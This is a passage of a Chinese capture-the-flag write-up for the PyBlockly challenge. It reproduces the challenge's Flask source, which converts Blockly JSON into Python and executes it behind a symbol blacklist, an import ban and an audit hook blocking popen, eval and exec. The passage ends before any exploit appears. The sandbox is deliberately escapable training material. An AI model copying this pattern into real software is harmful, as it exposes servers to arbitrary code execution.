+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><p><figure>
+  <img src="image-20241107161833137.png" alt="image-20241107161833137" loading="lazy"></figure>
+</p>
+<p>根目录服务为 JS Blockly 积木块，当拼接积木然后 <code>send</code> 发送时，会发送一个 JSON 数据，如发送 <code>1111</code></p>
+<p><figure>
+  <img src="image-20241107162007550.png" alt="image-20241107162007550" loading="lazy"></figure>
+</p>
+<p>​                                                                                                返回了<figure>
+  <img src="image-20241107162020328.png" alt="image-20241107162020328" loading="lazy"></figure>
+</p>
+<p><strong>源码如下：</strong></p>
+<p>app.py  // Flask Web服务核心源码</p>
+<div class="code-block highlight line-nos-hidden" data-mode="simple" data-copyable="true"><div class="code-wrapper" data-max="30" data-line-digit="3" style="--fi-max-shown-lines:30;--fi-line-digit:3;--fi-line-start:1;"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">flask</span> <span class="kn">import</span> <span class="n">Flask</span><span class="p">,</span> <span class="n">request</span><span class="p">,</span> <span class="n">jsonify</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">re</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">unidecode</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">string</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">ast</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">sys</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">os</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">subprocess</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">importlib.util</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">json</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">app</span> <span class="o">=</span> <span class="n">Flask</span><span class="p">(</span><span class="vm">__name__</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">app</span><span class="o">.</span><span class="n">config</span><span class="p">[</span><span class="s1">&#39;JSON_AS_ASCII&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="kc">False</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">blacklist_pattern</span> <span class="o">=</span> <span class="sa">r</span><span class="s2">&#34;[!</span><span class="se">\&#34;</span><span class="s2">#$%&amp;&#39;()*+,-./:;&lt;=&gt;?@[</span><span class="se">\\</span><span class="s2">\]^_`{|}~]&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">module_exists</span><span class="p">(</span><span class="n">module_name</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">spec</span> <span class="o">=</span> <span class="n">importlib</span><span class="o">.</span><span class="n">util</span><span class="o">.</span><span class="n">find_spec</span><span class="p">(</span><span class="n">module_name</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">spec</span> <span class="ow">is</span> <span class="kc">None</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="kc">False</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">module_name</span> <span class="ow">in</span> <span class="n">sys</span><span class="o">.</span><span class="n">builtin_module_names</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="kc">True</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">spec</span><span class="o">.</span><span class="n">origin</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">std_lib_path</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">dirname</span><span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="vm">__file__</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">spec</span><span class="o">.</span><span class="n">origin</span><span class="o">.</span><span class="n">startswith</span><span class="p">(</span><span class="n">std_lib_path</span><span class="p">)</span> <span class="ow">and</span> <span class="ow">not</span> <span class="n">spec</span><span class="o">.</span><span class="n">origin</span><span class="o">.</span><span class="n">startswith</span><span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="n">getcwd</span><span class="p">()):</span>
+</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="kc">True</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="kc">False</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">verify_secure</span><span class="p">(</span><span class="n">m</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">node</span> <span class="ow">in</span> <span class="n">ast</span><span class="o">.</span><span class="n">walk</span><span class="p">(</span><span class="n">m</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="k">match</span> <span class="nb">type</span><span class="p">(</span><span class="n">node</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">            <span class="k">case</span> <span class="n">ast</span><span class="o">.</span><span class="n">Import</span><span class="p">:</span>  
+</span></span><span class="line"><span class="cl">                <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;ERROR: Banned module &#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">                <span class="k">return</span> <span class="kc">False</span>
+</span></span><span class="line"><span class="cl">            <span class="k">case</span> <span class="n">ast</span><span class="o">.</span><span class="n">ImportFrom</span><span class="p">:</span> 
+</span></span><span class="line"><span class="cl">                <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;ERROR: Banned module </span><span class="si">{</span><span class="n">node</span><span class="o">.</span><span class="n">module</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">                <span class="k">return</span> <span class="kc">False</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="kc">True</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">check_for_blacklisted_symbols</span><span class="p">(</span><span class="n">input_text</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">re</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="n">blacklist_pattern</span><span class="p">,</span> <span class="n">input_text</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="kc">True</span>
+</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="kc">False</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">block_to_python</span><span class="p">(</span><span class="n">block</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">block_type</span> <span class="o">=</span> <span class="n">block</span><span class="p">[</span><span class="s1">&#39;type&#39;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">    <span class="n">code</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">block_type</span> <span class="o">==</span> <span class="s1">&#39;print&#39;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">text_block</span> <span class="o">=</span> <span class="n">block</span><span class="p">[</span><span class="s1">&#39;inputs&#39;</span><span class="p">][</span><span class="s1">&#39;TEXT&#39;</span><span class="p">][</span><span class="s1">&#39;block&#39;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">        <span class="n">text</span> <span class="o">=</span> <span class="n">block_to_python</span><span class="p">(</span><span class="n">text_block</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">code</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&#34;print(</span><span class="si">{</span><span class="n">text</span><span class="si">}</span><span class="s2">)&#34;</span>
+</span></span><span class="line"><span class="cl">           
+</span></span><span class="line"><span class="cl">    <span class="k">elif</span> <span class="n">block_type</span> <span class="o">==</span> <span class="s1">&#39;math_number&#39;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="nb">str</span><span class="p">(</span><span class="n">block</span><span class="p">[</span><span class="s1">&#39;fields&#39;</span><span class="p">][</span><span class="s1">&#39;NUM&#39;</span><span class="p">])</span><span class="o">.</span><span class="n">isdigit</span><span class="p">():</span>      
+</span></span><span class="line"><span class="cl">            <span class="n">code</span> <span class="o">=</span>  <span class="nb">int</span><span class="p">(</span><span class="n">block</span><span class="p">[</span><span class="s1">&#39;fields&#39;</span><span class="p">][</span><span class="s1">&#39;NUM&#39;</span><span class="p">])</span> 
+</span></span><span class="line"><span class="cl">        <span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="n">code</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">elif</span> <span class="n">block_type</span> <span class="o">==</span> <span class="s1">&#39;text&#39;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">check_for_blacklisted_symbols</span><span class="p">(</span><span class="n">block</span><span class="p">[</span><span class="s1">&#39;fields&#39;</span><span class="p">][</span><span class="s1">&#39;TEXT&#39;</span><span class="p">]):</span>
+</span></span><span class="line"><span class="cl">            <span class="n">code</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        
+</span></span><span class="line"><span class="cl">            <span class="n">code</span> <span class="o">=</span>  <span class="s2">&#34;&#39;&#34;</span> <span class="o">+</span> <span class="n">unidecode</span><span class="o">.</span><span class="n">unidecode</span><span class="p">(</span><span class="n">block</span><span class="p">[</span><span class="s1">&#39;fields&#39;</span><span class="p">][</span><span class="s1">&#39;TEXT&#39;</span><span class="p">])</span> <span class="o">+</span> <span class="s2">&#34;&#39;&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">elif</span> <span class="n">block_type</span> <span class="o">==</span> <span class="s1">&#39;max&#39;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        
+</span></span><span class="line"><span class="cl">        <span class="n">a_block</span> <span class="o">=</span> <span class="n">block</span><span class="p">[</span><span class="s1">&#39;inputs&#39;</span><span class="p">][</span><span class="s1">&#39;A&#39;</span><span class="p">][</span><span class="s1">&#39;block&#39;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">        <span class="n">b_block</span> <span class="o">=</span> <span class="n">block</span><span class="p">[</span><span class="s1">&#39;inputs&#39;</span><span class="p">][</span><span class="s1">&#39;B&#39;</span><span class="p">][</span><span class="s1">&#39;block&#39;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">        <span class="n">a</span> <span class="o">=</span> <span class="n">block_to_python</span><span class="p">(</span><span class="n">a_block</span><span class="p">)</span>  
+</span></span><span class="line"><span class="cl">        <span class="n">b</span> <span class="o">=</span> <span class="n">block_to_python</span><span class="p">(</span><span class="n">b_block</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">code</span> <span class="o">=</span>  <span class="sa">f</span><span class="s2">&#34;max(</span><span class="si">{</span><span class="n">a</span><span class="si">}</span><span class="s2">, </span><span class="si">{</span><span class="n">b</span><span class="si">}</span><span class="s2">)&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">elif</span> <span class="n">block_type</span> <span class="o">==</span> <span class="s1">&#39;min&#39;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">a_block</span> <span class="o">=</span> <span class="n">block</span><span class="p">[</span><span class="s1">&#39;inputs&#39;</span><span class="p">][</span><span class="s1">&#39;A&#39;</span><span class="p">][</span><span class="s1">&#39;block&#39;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">        <span class="n">b_block</span> <span class="o">=</span> <span class="n">block</span><span class="p">[</span><span class="s1">&#39;inputs&#39;</span><span class="p">][</span><span class="s1">&#39;B&#39;</span><span class="p">][</span><span class="s1">&#39;block&#39;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">        <span class="n">a</span> <span class="o">=</span> <span class="n">block_to_python</span><span class="p">(</span><span class="n">a_block</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">b</span> <span class="o">=</span> <span class="n">block_to_python</span><span class="p">(</span><span class="n">b_block</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">code</span> <span class="o">=</span>  <span class="sa">f</span><span class="s2">&#34;min(</span><span class="si">{</span><span class="n">a</span><span class="si">}</span><span class="s2">, </span><span class="si">{</span><span class="n">b</span><span class="si">}</span><span class="s2">)&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="s1">&#39;next&#39;</span> <span class="ow">in</span> <span class="n">block</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        
+</span></span><span class="line"><span class="cl">        <span class="n">block</span> <span class="o">=</span> <span class="n">block</span><span class="p">[</span><span class="s1">&#39;next&#39;</span><span class="p">][</span><span class="s1">&#39;block&#39;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">        
+</span></span><span class="line"><span class="cl">        <span class="n">code</span> <span class="o">+=</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span> <span class="o">+</span> <span class="n">block_to_python</span><span class="p">(</span><span class="n">block</span><span class="p">)</span><span class="o">+</span> <span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">code</span> 
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">code</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">json_to_python</span><span class="p">(</span><span class="n">blockly_data</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">block</span> <span class="o">=</span> <span class="n">blockly_data</span><span class="p">[</span><span class="s1">&#39;blocks&#39;</span><span class="p">][</span><span class="s1">&#39;blocks&#39;</span><span class="p">][</span><span class="mi">0</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">python_code</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">python_code</span> <span class="o">+=</span> <span class="n">block_to_python</span><span class="p">(</span><span class="n">block</span><span class="p">)</span> <span class="o">+</span> <span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span> 
+</span></span><span class="line"><span class="cl">        
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">python_code</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">do</span><span class="p">(</span><span class="n">source_code</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">hook_code</span> <span class="o">=</span> <span class="s1">&#39;&#39;&#39;
+</span></span></span><span class="line"><span class="cl"><span class="s1">def my_audit_hook(event_name, arg):
+</span></span></span><span class="line"><span class="cl"><span class="s1">    blacklist = [&#34;popen&#34;, &#34;input&#34;, &#34;eval&#34;, &#34;exec&#34;, &#34;compile&#34;, &#34;memoryview&#34;]
+</span></span></span><span class="line"><span class="cl"><span class="s1">    if len(event_name) &gt; 4:
+</span></span></span><span class="line"><span class="cl"><span class="s1">        raise RuntimeError(&#34;Too Long!&#34;)
+</span></span></span><span class="line"><span class="cl"><span class="s1">    for bad in blacklist:
+</span></span></span><span class="line"><span class="cl"><span class="s1">        if bad in event_name:
+</span></span></span><span class="line"><span class="cl"><span class="s1">            raise RuntimeError(&#34;No!&#34;)
+</span></span></span><span class="line"><span class="cl"><span class="s1">
+</span></span></span><span class="line"><span class="cl"><span class="s1">__import__(&#39;sys&#39;).addaudithook(my_audit_hook)
+</span></span></span><span class="line"><span class="cl"><span class="s1">
+</span></span></span><span class="line"><span class="cl"><span class="s1">&#39;&#39;&#39;</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="n">source_code</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">code</span> <span class="o">=</span> <span class="n">hook_code</span> <span class="o">+</span> <span class="n">source_code</span>
+</span></span><span class="line"><span class="cl">    <span class="n">tree</span> <span class="o">=</span> <span class="nb">compile</span><span class="p">(</span><span class="n">source_code</span><span class="p">,</span> <span class="s2">&#34;run.py&#34;</span><span class="p">,</span> <span class="s1">&#39;exec&#39;</span><span class="p">,</span> <span class="n">flags</span><span class="o">=</span><span class="n">ast</span><span class="o">.</span><span class="n">PyCF_ONLY_AST</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">try</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">verify_secure</span><span class="p">(</span><span class="n">tree</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">            <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&#34;run.py&#34;</span><span class="p">,</span> <span class="s1">&#39;w&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">code</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="n">result</span> <span class="o">=</span> <span class="n">subprocess</span><span class="o">.</span><span class="n">run</span><span class="p">([</span><span class="s1">&#39;python&#39;</span><span class="p">,</span> <span class="s1">&#39;run.py&#39;</span><span class="p">],</span> <span class="n">stdout</span><span class="o">=</span><span class="n">subprocess</span><span class="o">.</span><span class="n">PIPE</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">5</span><span class="p">)</span><span class="o">.</span><span class="n">stdout</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s2">&#34;utf-8&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="n">os</span><span class="o">.</span><span class="n">remove</span><span class="p">(</span><span class="s1">&#39;run.py&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="n">result</span>
+</span></span><span class="line"><span class="cl">        <span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="s2">&#34;Execution aborted due to security concerns.&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">except</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">os</span><span class="o">.</span><span class="n">remove</span><span class="p">(</span><span class="s1">&#39;run.py&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="s2">&#34;Timeout!&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s1">&#39;/&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">index</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">app</span><span class="o">.</span><span class="n">send_static_file</span><span class="p">(</span><span class="s1">&#39;index.html&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s1">&#39;/blockly_json&#39;</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;POST&#39;</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">blockly_json</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="n">blockly_data</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">get_data</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="n">blockly_data</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="nb">type</span><span class="p">(</span><span class="n">blockly_data</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">    <span class="n">blockly_data</span> <span class="o">=</span> <span class="n">json</span><span class="o">.</span><span class="n">loads</span><span class="p">(</span><span class="n">blockly_data</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s1">&#39;utf-8&#39;</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="n">blockly_data</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">try</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">python_code</span> <span class="o">=</span> <span class="n">json_to_python</span><span class="p">(</span><span class="n">blockly_data</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">do</span><span class="p">(</span><span class="n">python_code</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">jsonify</span><span class="p">({</span><span class="s2">&#34;error&#34;</span><span class="p">:</span> <span class="s2">&#34;Error generating Python code&#34;</span><span class="p">,</span> <span class="s2">&#34;details&#34;</span><span class="p">:</span> <span class="nb">str</span><span class="p">(</span><span class="n">e</span><span class="p">)})</span>
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">app</span><span class="o">.</span><span class="n">run</span><span class="p">(</span><span class="n">host</span> <span class="o">=</span> <span class="s1">&#39;0.0.0.0&#39;</span><span class="p">)</span></span></span></code></pre></div><div class="code-copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-width-auto" aria-hidden="true"></i></div><div class="code-expand-btn" aria-label="Expand or collapse code block" role="button"><i class="fa-solid fa-angles-down" aria-hidden="true"></i></div></div><p>index.html  //网站根目录 JS 服务，会给 <code>/blockly_json</code> 发送 POST 请求及数据</p>
+<div class="code-block highlight line-nos-hidden" data-mode="simple" data-copyable="true"><div class="code-wrapper" data-max="30" data-line-digit="3" style="--fi-max-shown-lines:30;--fi-line-digit:3;--fi-line-start:1;"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">&lt;!DOCTYPE html&gt;
+</span></span><span class="line"><span class="cl">&lt;html&gt;
+</span></span><span class="line"><span class="cl">  &lt;head&gt;
+</span></span><span class="line"><span class="cl">    &lt;meta charset=&#34;utf-8&#34;&gt;
+</span></span><span class="line"><span class="cl">    &lt;title&gt;PyBlockly&lt;/title&gt;
+</span></span><span class="line"><span class="cl">    &lt;script src=&#34;https://unpkg.com/blockly/blockly.min.js&#34;&gt;&lt;/script&gt;
+</span></span><span class="line"><span class="cl">    &lt;script src=&#34;https://code.jquery.com/jquery-3.6.0.min.js&#34;&gt;&lt;/script&gt;
+</span></span><span class="line"><span class="cl">  &lt;/head&gt;
+</span></span><span class="line"><span class="cl">  &lt;body&gt;
+</span></span><span class="line"><span class="cl">    &lt;h1&gt;PyBlockly&lt;/h1&gt;
+</span></span><span class="line"><span class="cl">    &lt;div id=&#34;blocklyDiv&#34; style=&#34;height: 480px; width: 600px;&#34;&gt;&lt;/div&gt;
+</span></span><span class="line"><span class="cl">    &lt;button id=&#34;saveButton&#34;&gt;Send&lt;/button&gt;
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    &lt;xml id=&#34;toolbox&#34; style=&#34;display: none&#34;&gt;
+</span></span><span class="line"><span class="cl">      &lt;block type=&#34;text&#34;&gt;&lt;/block&gt;
+</span></span><span class="line"><span class="cl">      &lt;block type=&#34;math_number&#34;&gt;&lt;/block&gt;
+</span></span><span class="line"><span class="cl">      &lt;block type=&#34;math_arithmetic&#34;&gt;&lt;/block&gt;
+</span></span><span class="line"><span class="cl">      &lt;block type=&#34;print&#34;&gt;&lt;/block&gt;
+</span></span><span class="line"><span class="cl">      &lt;block type=&#34;max&#34;&gt;&lt;/block&gt;
+</span></span><span class="line"><span class="cl">      &lt;block type=&#34;min&#34;&gt;&lt;/block&gt;
+</span></span><span class="line"><span class="cl">    &lt;/xml&gt;
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    &lt;script&gt;
+</span></span><span class="line"><span class="cl">      // Define custom &#39;print&#39; block
+</span></span><span class="line"><span class="cl">      Blockly.defineBlocksWithJsonArray([{
+</span></span><span class="line"><span class="cl">        &#34;type&#34;: &#34;print&#34;,
+</span></span><span class="line"><span class="cl">        &#34;message0&#34;: &#34;print %1&#34;,
+</span></span><span class="line"><span class="cl">        &#34;args0&#34;: [
+</span></span><span class="line"><span class="cl">          {
+</span></span><span class="line"><span class="cl">            &#34;type&#34;: &#34;input_value&#34;,
+</span></span><span class="line"><span class="cl">            &#34;name&#34;: &#34;TEXT&#34;
+</span></span><span class="line"><span class="cl">          }
+</span></span><span class="line"><span class="cl">        ],
+</span></span><span class="line"><span class="cl">        &#34;previousStatement&#34;: null,
+</span></span><span class="line"><span class="cl">        &#34;nextStatement&#34;: null,
+</span></span><span class="line"><span class="cl">        &#34;colour&#34;: 160,
+</span></span><span class="line"><span class="cl">        &#34;tooltip&#34;: &#34;Prints a value&#34;,
+</span></span><span class="line"><span class="cl">        &#34;helpUrl&#34;: &#34;&#34;
+</span></span><span class="line"><span class="cl">      }]);
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">      // Define custom &#39;max&#39; block
+</span></span><span class="line"><span class="cl">      Blockly.defineBlocksWithJsonArray([{
+</span></span><span class="line"><span class="cl">        &#34;type&#34;: &#34;max&#34;,
+</span></span><span class="line"><span class="cl">        &#34;message0&#34;: &#34;max of %1 and %2&#34;,
+</span></span><span class="line"><span class="cl">        &#34;args0&#34;: [
+</span></span><span class="line"><span class="cl">          {
+</span></span><span class="line"><span class="cl">            &#34;type&#34;: &#34;input_value&#34;,
+</span></span><span class="line"><span class="cl">            &#34;name&#34;: &#34;A&#34;
+</span></span><span class="line"><span class="cl">          },
+</span></span><span class="line"><span class="cl">          {
+</span></span><span class="line"><span class="cl">            &#34;type&#34;: &#34;input_value&#34;,
+</span></span><span class="line"><span class="cl">            &#34;name&#34;: &#34;B&#34;
+</span></span><span class="line"><span class="cl">          }
+</span></span><span class="line"><span class="cl">        ],
+</span></span><span class="line"><span class="cl">        &#34;output&#34;: &#34;Number&#34;,
+</span></span><span class="line"><span class="cl">        &#34;colour&#34;: 230,
+</span></span><span class="line"><span class="cl">        &#34;tooltip&#34;: &#34;Returns the maximum of two numbers&#34;,
+</span></span><span class="line"><span class="cl">        &#34;helpUrl&#34;: &#34;&#34;
+</span></span><span class="line"><span class="cl">      }]);
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">      // Define custom &#39;min&#39; block
+</span></span><span class="line"><span class="cl">      Blockly.defineBlocksWithJsonArray([{
+</span></span><span class="line"><span class="cl">        &#34;type&#34;: &#34;min&#34;,
+</span></span><span class="line"><span class="cl">        &#34;message0&#34;: &#34;min of %1 and %2&#34;,
+</span></span><span class="line"><span class="cl">        &#34;args0&#34;: [
+</span></span><span class="line"><span class="cl">          {
+</span></span><span class="line"><span class="cl">            &#34;type&#34;: &#34;input_value&#34;,
+</span></span><span class="line"><span class="cl">            &#34;name&#34;: &#34;A&#34;
+</span></span><span class="line"><span class="cl">          },
+</span></span><span class="line"><span class="cl">          {
+</span></span><span class="line"><span class="cl">            &#34;type&#34;: &#34;input_value&#34;,
+</span></span><span class="line"><span class="cl">            &#34;name&#34;: &#34;B&#34;
+</span></span><span class="line"><span class="cl">          }
+</span></span><span class="line"><span class="cl">        ],
+</span></span><span class="line"><span class="cl">        &#34;output&#34;: &#34;Number&#34;,
+</span></span><span class="line"><span class="cl">        &#34;colour&#34;: 230,
+</span></span><span class="line"><span class="cl">        &#34;tooltip&#34;: &#34;Returns the minimum of two numbers&#34;,
